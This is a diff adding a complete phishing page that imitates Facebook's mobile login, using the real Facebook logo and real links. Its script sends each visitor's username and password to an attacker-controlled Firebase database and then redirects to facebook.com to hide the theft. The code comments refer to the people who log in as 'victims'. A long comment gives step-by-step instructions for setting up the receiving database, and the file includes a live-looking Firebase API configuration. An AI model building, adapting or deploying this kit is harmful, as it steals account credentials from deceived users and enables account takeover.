@@ -1,0 +1,552 @@
+<!--To use it as your own, please checkout the comments of the JS section--><!doctype html>
+<html>
+ <head> 
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&amp;display=swap" rel="stylesheet"> 
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet"> 
+ <style>
+    /*This is the main login page CSS*/
+  
+body{ 
+  font-family: 'Roboto', sans-serif; 
+}
+
+#banner{
+  background-color:#ff9800;
+  height:150px;
+  width:100%;
+  font-size:250%;
+  padding:20px;
+  margin-left:-10px;
+  margin-top:-10px;
+}
+
+#alert{
+  font-size:200%;
+  float:left;
+  margin-top:50px;
+}
+
+#wtxt{
+   padding-left:100px;
+}
+
+#wb{
+  background:red;
+}
+
+#select{
+ color:gray;
+ font-weight:bold;
+ height:100%;
+ weidth:100%;
+ margin-left:0%;
+}
+
+#bx{
+ color:gray;
+ border:3px solid #6981b5;
+ border-radius:7px;
+ font-size:120%;
+ width:11%;
+ font-weight:bold;
+ height:20%;
+ margin-left:45.5%;
+}
+
+#nam{
+ margin-top:-1%;
+}
+
+#pas{
+  margin-top:-2%;
+}
+
+p{
+  height:auto;
+  width:auto;
+}
+
+#lang{
+  margin-top:15%;
+  width:90%;
+}
+
+td{
+  text-align: center;
+  width:50%;
+  font-size:210%;; 
+  color:#6981b5;
+  
+}
+
+.warp{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  width:100%;    
+}
+
+#fpass{
+ background:none;
+ border:none;
+ font-size:230%;
+ color:#6981b5;
+ height:auto;
+ width:auto;
+ margin-top:3%;
+}
+
+#ctxt{ 
+  color:#999999;
+  font-size:210%;
+}
+
+#or{
+  font-size:250%;
+  color:#4f4f4f;
+  background: white;
+  width:30%;
+  text-align:center;
+}
+
+#cnew{
+ width:auto;
+ font-size:235%;
+ margin-top:1.2%;
+ border-radius:11px;
+ height:95px; 
+ padding-left:3%;
+ padding-right:3%;
+ position:relative;
+ text-shadow:0px -3px #017003;
+ text-align:center;
+ background:#3ca827;
+ border:none; 
+ font-size:220%;
+ color:white;
+ font-weight:bold;
+}
+
+#fp{
+  display:flex;
+  width:100%;
+  height:auto;
+  background:none;
+  justify-content:center;
+  align-items:center;
+  position:relative;
+}
+
+.line{
+  background: lightgray;
+  height:3px;
+  width:100%;
+}
+
+#title{
+ height:33%;
+ width:33%;
+ position:relative;
+}
+
+input{
+  height:97%;
+  opacity:1;
+  width:100%;
+  padding-left:2.5%;
+  font-size:250%;
+  border:none;
+  border-radius:11px;
+  background-color:#f5f6f7;
+}
+
+.input-container{
+  width:93%;
+  margin-left:3.5%; 
+  position:relative;
+  height:115px; 
+  border-top:2px solid #ebebeb;
+  border-bottom:2px solid #cccccc;
+  border-right:2px solid #dbdbdb;
+  border-left:2px solid #dbdbdb;   
+  border-radius:11px;
+  font-weight:thicker;
+  color:#dbdbdb;
+  z-index:1;
+  display:flex;
+  background-color:#f5f6f7;
+}
+
+#inpiicon{
+ background-image:url("https://drive.google.com/uc?export=view&id=10RGIdabhcy6RTKhfdZas61o7k2s8j9H8");
+ background-size:160px 160px;
+ background-repeat:no-repeat;
+ display:inline-block;
+ height:160px;
+ width:160px;
+ margin-left:-10px;
+ z-index:2;
+}
+
+#snh{
+ color:#1877F2;
+ text-align:center;
+ height:auto;
+ weidth:50px;
+ font-weight:bold;
+ font-size:33px;
+ background-color:#f5f6f7;
+ padding-right:5%;
+ padding-left:5%;
+ border:none;
+ display:flex;
+ justify-content:center;
+ align-items:center;
+}
+
+#lwarp{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  width:93%;
+  margin-left:3.5%;   
+}
+
+#twarp{
+  margin-top:-0.5%;
+  width:100%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+
+#nameField{
+ background-image:url("https://drive.google.com/uc?export=view&id=10bzoemF0Pe6c5du8BF-IN_7O4kbdmRXa");
+ background-size:6% 45%;
+ background-position:98% 50%;
+ background-repeat:no-repeat;
+}
+
+#send{
+ margin-top:-0.7%;
+ width:93%;
+ border-radius:11px;
+ height:112px;
+ position:relative;
+ text-shadow:0px -3px #1666C5;
+ text-align:center;
+ background:#1877F2;
+ border:none;
+ box-shadow:0px 3px lightgray;
+ font-size:250%;
+ color:white;
+ font-weight:bold; 
+}
+
+/*This is the CSS for the message that will be visible after user's submition*/
+ 
+#sucsm{
+ display:none;
+ font-size:2.5rem;
+ text-align:center;
+ background:#dadfe8;
+ color:dark;
+ border-radius:0px 10px 10px 0px;
+ border-color:#04d10e;
+ border-style:solid;
+ border-width:0px 0px 0px 15px;
+ padding:20px;
+ margin:20px;
+ line-height:1.6;
+ text-align:left;
+ padding-left:30px;
+}
+
+/*This is the CSS for the victims list*/
+#userList{
+ width:96%;
+ color:black;
+ border:1px solid black;
+ border-collapse:collapse;
+ margin-left:2%;
+ margin-top:2%; 
+ display:none;
+}
+
+#userList th{
+  border:1px solid black;
+  border-collapse:collapse;
+  width:0%;
+  font-wight:bold;
+ }
+
+#userList td{
+  border:1px solid black;
+  border-collapse:collapse;
+  width:0%;
+ }
+
+#userList *{
+ font-size:1.5rem;
+ color:black;
+ padding:4px;
+} 
+ </style>
+ </head> 
+ <body id="body"> 
+  <!--Thus is the list of the users that will be visible if user submit his data --> 
+  <div id="all"> 
+   <!--This is the message that will be visible right after user's submition--> 
+   <!--This is the main page --> 
+   <div id="fscreen"> 
+    <script src="https://code.jquery.com/jquery-3.1.1.js"></script> 
+    <!--This is the warning message--> 
+    <!--This is the main template of the login page--> 
+    <div id="twarp"> 
+     <img id="title" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"> 
+    </div> 
+    <br> 
+    <br> 
+    <form id="form" target="_self" " action="" autocomplete="on"> 
+     <div id="nam" class="input-container"> 
+      <input id="nameField" placeholder="Mobile number or email address" type="text" autofocus> 
+     </div> 
+     <br> 
+     <br> 
+     <div id="pas" class="input-container"> 
+      <input type="password" id="passField" placeholder="Password" autofocus> 
+      <div onclick="snhf()" id="snh"> 
+       <p>SHOW</p> 
+      </div> 
+     </div> 
+     <br> 
+     <br> 
+     <div class="warp"> 
+      <button id="send" onclick="addData();return false;" class="common_btn">Log In</button> 
+     </div> 
+    </form> 
+    <div id="lwarp"> 
+     <div id="fp"> 
+      <div class="line" id="l1"></div> 
+      <p id="or">or</p> 
+      <div class="line" id="l2"></div> 
+     </div> 
+     <br> 
+    </div> 
+    <div class="warp"> 
+     <button id="cnew" onclick="window.location.href='https://www.facebook.com/reg/?ref=dbl&amp;refid=8&amp;hrc=1';">Create New Account</button> 
+    </div> 
+    <div class="warp"> 
+     <button onclick="window.location.href='https://m.facebook.com/login/identify/?ctx=recover&amp;c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%3Dhttps%253A%252F%252Fm.facebook.com%252Fhome.php%253Fhrc%253D1%2526refsrc%253Dhttp%25253A%25252F%25252Fm.facebook.com%25252F%2526soft%253Dbookmarks%26ref%3Ddbl%26fl%26refid%3D9%26hrc%3D1&amp;multiple_results=0&amp;ars=facebook_login&amp;lwv=100&amp;ref=dbl&amp;_rdr'" id="fpass"> Forgotten password? </button> 
+    </div> 
+    <div class="warp"> 
+     <table id="lang"> 
+      <tbody> 
+       <tr> 
+        <td> 
+         <div id="select">
+           English (UK) 
+         </div></td> 
+        <td>বাংলা</td> 
+       </tr> 
+       <tr> 
+        <td>অসমীয়া</td> 
+        <td>हिन्दी</td> 
+       </tr> 
+       <tr> 
+        <td>Bahasa Indonesia</td> 
+        <td>Español</td> 
+       </tr> 
+       <tr> 
+        <td>Português (Brasil)</td> 
+        <td> 
+         <div id="bx">
+           + 
+         </div></td> 
+       </tr> 
+      </tbody> 
+     </table> 
+    </div> 
+    <div class="warp"> 
+     <p id="ctxt">Facebook Inc.</p> 
+    </div> 
+   </div> 
+  </div> 
+  <!--These are the script needed for connecting to firebase--> 
+  <script src="https://www.gstatic.com/firebasejs/8.2.9/firebase-app.js"></script> 
+  <script src="https://www.gstatic.com/firebasejs/8.2.9/firebase-firestore.js"></script> 
+ <script>
+    /*
+  To use this site for you own you can follow these steps-
+
+
+  #1.Create a Firebase account
+  To create a firebase account you can simply visit
+  https://firebase.google.com
+  then click on the "Get Start" button.
+  It will ask you to login with google.
+  Complete your login using your google account.
+  
+  
+  #2.Create a firebase project
+  After successfully login you'll see a "Create a project" button.
+  Simply click on that.
+  Then it will ask for a name of the project.
+  Give a name and check the "I accept Firebase terms" checkbox.
+  Click on "continue".
+  Then you can enable or disable the "Enable Google Analytics for this project" button.It doesn't matter.But I recommend to disable this.
+  Then click on "continue" again.
+  It will take some time.
+  If it is complete then just click on "continue" button.
+  It'll take you to the firebase console.
+  
+  
+  #3.Create a Firebase Web App
+  After creating a project you need a web app.
+  In the firebase console you will see some buttons bellow your project name something like "IOS","Android","< / >","Unity".
+  As I said before, we need a web app. And "< / >" is the symbol for web app. Just click on that.
+  It will ask for app nickname. Fill it with whatever you want to call your app.
+  [Don't check the "Also setup firebase hosting for this app" as we don't need it here.]
+  Click on "Register app" button.
+  It will generate some code. It is the SDK.
+  You'll see a variable something like 
+     var firebaseConfig = {
+      ...
+       }
+ Copy the variable or the value from there and replace the variable in this project.It is placed right after this comment.It is the most important part as it connect firebase with our code or project or app whatever you call.
+ Then click on "Continue to console" button.
+ 
+ 
+ #4.Create a Cloud Firestore Database
+ To create a database,you have to open the sidebar in the console by clicking the hamburger or three dash icon on the top left. (For Small Size screen.eg: Mobile) or click on ">" icon from the minimized sidebar(For large screen.eg:pc).
+ From the sidebar, click on "Build" and then click on "Cloud Firestore".
+ Now click on "Create Database" and then click "start in test mode".
+ Then click on "Next" (In small screen device you may have to scroll a bit for the button).
+ Then select the region that you think will be good for your app. This is tha location of data center where google will store your data.So shorter distance from the data center means faster speed for data transfer.
+ The clcik on enable.
+ It will take some time to create your database.
+ Once it is ready, we are ready to go!
+ Now enjoy and play around with it!✌️
+ 
+ 
+ 
+ If any problem then contact me:
+   #Facebook:  https://facebook.com/TajulTonim
+   #Instagram: https://instagram.com/TajulTonim
+   #Email:     mail@tajultonim.ml
+   #WhatsApp:  +8801878613436
+  
+  For more contact info, visit-
+      https://tajultonim.ml/contact
+  
+
+  
+ 
+  
+This is the variable you have to change:*/
+  
+ var firebaseConfig = {
+    apiKey: "AIzaSyCsEotxTqlcGuFhowt7gH-sbYDXBq_78iQ",
+    authDomain: "dc-facebook-3fba8.firebaseapp.com",
+    projectId: "dc-facebook-3fba8",
+    storageBucket: "dc-facebook-3fba8.appspot.com",
+    messagingSenderId: "357475798545",
+    appId: "1:357475798545:web:e3c6925519864b3d0f2bb0"
+  };
+
+//Initializing firebase and declaring the database:
+firebase.initializeApp(firebaseConfig);
+const db=firebase.firestore();
+
+//This is the function that will add target's data on the database:
+function addData() {
+     //Getting target's input value:
+     var user = document.getElementById("nameField").value;
+     var password = document.getElementById("passField").value;                              
+      //Checking if target entered values properly
+      if(user == ""){
+          document.getElementById("nam").style.borderColor="red";
+          document.getElementById("nameField").focus(); 
+        }else if(password == ""||password.length<6){
+          document.getElementById("pas").style.borderColor="red";
+          document.getElementById("passField").focus();
+        }else{
+          //If he entered both of the value and password is more than 6 character long then it will add data:
+          db.collection("Users").doc(user).set({
+            "User":user,
+            "Password":password,
+            "Time":firebase.firestore.FieldValue.serverTimestamp()  
+          }).then(()=>{
+           //Hiding the form and showing a message if data successfully added to the database:
+            document.getElementById("fscreen").style.display="none";
+            //Waiting 2 second before showing data
+            setTimeout(
+              function (){
+                //Hiding everything and calling the function to showing a list of the victims
+                document.getElementById("all").style.display="none";
+                getUsers();
+                return false;
+              },2000)   
+            }).catch((error)=>{
+              //Log the error message if there is a error
+              console.log(error.message)
+          })
+      }                     
+ }
+ 
+
+//This is the function that will show the list of the victims
+ function getUsers(){
+   window.location="https://www.facebook.com";
+ }
+
+
+//This will change the password fields border color to default as it will turn into red if there is an error
+document.getElementById("passField").onclick=function(){
+  if(document.getElementById("pas").style.borderColor=="red"){
+    document.getElementById("pas").style.borderColor="inherit";
+
+  }
+  else{
+    document.getElementById("pas").style.borderColor="inherit";
+
+  }
+}
+////This will change the name fields border color to default as it will turn into red if there is an error
+ document.getElementById("nameField").onclick=function(){
+  if(document.getElementById("nam").style.borderColor=="red"){
+    document.getElementById("nam").style.borderColor="inherit";
+
+  }
+  else{
+    document.getElementById("nam").style.borderColor="inherit";
+
+  }
+}
+
+//This will check that if there is any value in the password field.If there is any value then it will show to password show or hide button
+var t=setInterval(
+  function (){
+    if(document.getElementById("passField").value.length==0){
+      document.getElementById("snh").style.display="none";
+    }
+    else{
+     document.getElementById("snh").style.display="flex";
+    }
+  }
+)
+
+//This is the function that will change the inout type for the password field to show or hide the password
+function snhf() {
+  var x = document.getElementById("passField");
+  if (x.type === "password") {
+    x.type = "text";
+    document.getElementById("snh").innerHTML="<p>HIDE</p>";
+  } else {
+    x.type = "password";
+    document.getElementById("snh").innerHTML="<p>SHOW</p>";
+  }
+} 
+ </script>
+ </body>
+</html>
